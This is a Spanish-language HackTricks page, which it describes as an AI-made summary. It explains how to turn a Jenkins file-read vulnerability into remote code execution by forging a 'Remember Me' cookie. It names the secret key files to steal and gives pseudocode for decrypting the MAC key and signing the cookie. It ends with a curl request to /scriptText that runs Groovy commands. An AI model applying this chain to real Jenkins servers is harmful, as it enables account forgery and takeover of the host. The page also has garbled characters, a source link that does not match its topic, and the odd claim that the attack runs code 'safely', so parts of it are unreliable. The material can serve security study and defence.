# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

En esta publicaci贸n del blog es posible encontrar una gran manera de transformar una vulnerabilidad de Inclusi贸n de Archivos Locales en Jenkins en RCE: [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

Este es un resumen creado por IA de la parte de la publicaci贸n donde se abusa de la creaci贸n de una cookie arbitraria para obtener RCE abusando de una lectura de archivos locales hasta que tenga tiempo para crear un resumen por mi cuenta:

### Requisitos Previos del Ataque

* **Requisito de Funcionalidad:** "Recuerdame" debe estar habilitado (configuraci贸n predeterminada).
* **Niveles de Acceso:** El atacante necesita permisos de Lectura/General.
* **Acceso Secreto:** Capacidad para leer tanto contenido binario como textual de archivos clave.

### Proceso de Explotaci贸n Detallado

#### Paso 1: Recolecci贸n de Datos

**Recuperaci贸n de Informaci贸n del Usuario**

* Acceder a la configuraci贸n del usuario y secretos desde `$JENKINS_HOME/users/*.xml` para cada usuario para recopilar:
* **Nombre de usuario**
* **Semilla del usuario**
* **Marca de tiempo**
* **Hash de contrase帽a**

**Extracci贸n de Claves Secretas**

* Extraer claves criptogr谩ficas utilizadas para firmar la cookie:
* **Clave Secreta:** `$JENKINS_HOME/secret.key`
* **Clave Maestra:** `$JENKINS_HOME/secrets/master.key`
* **Archivo de Clave MAC:** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### Paso 2: Falsificaci贸n de Cookies

**Preparaci贸n del Token**

*   **Calcular Tiempo de Expiraci贸n del Token:**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // Agrega una hora al tiempo actual
```
{% endcode %}
*   **Concatenar Datos para el Token:**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**Desencriptaci贸n de la Clave MAC**

*   **Desencriptar Archivo de Clave MAC:**

```javascript
key = toAes128Key(masterKey)  // Convertir clave maestra a formato de clave AES128
decrypted = AES.decrypt(macFile, key)  // Desencriptar el archivo .mac
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**C谩lculo de la Firma**

*   **Calcular HMAC SHA256:**

```javascript
mac = HmacSHA256(token, macKey)  // Calcular HMAC usando el token y la clave MAC
tokenSignature = bytesToHexString(mac)  // Convertir el MAC a una cadena hexadecimal
```

**Codificaci贸n de la Cookie**

*   **Generar Cookie Final:**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // Codificar en base64 los datos de la cookie
```
{% endcode %}

#### Paso 3: Ejecuci贸n de C贸digo

**Autenticaci贸n de Sesi贸n**

* **Obtener Tokens CSRF y de Sesi贸n:**
* Hacer una solicitud a `/crumbIssuer/api/json` para obtener `Jenkins-Crumb`.
* Capturar `JSESSIONID` de la respuesta, que se utilizar谩 junto con la cookie de "recuerdame".

**Solicitud de Ejecuci贸n de Comando**

*   **Enviar una Solicitud POST con Script Groovy:**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* El script Groovy se puede utilizar para ejecutar comandos a nivel de sistema u otras operaciones dentro del entorno de Jenkins.

El comando curl de ejemplo proporcionado demuestra c贸mo hacer una solicitud a Jenkins con los encabezados y cookies necesarios para ejecutar c贸digo arbitrario de manera segura.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
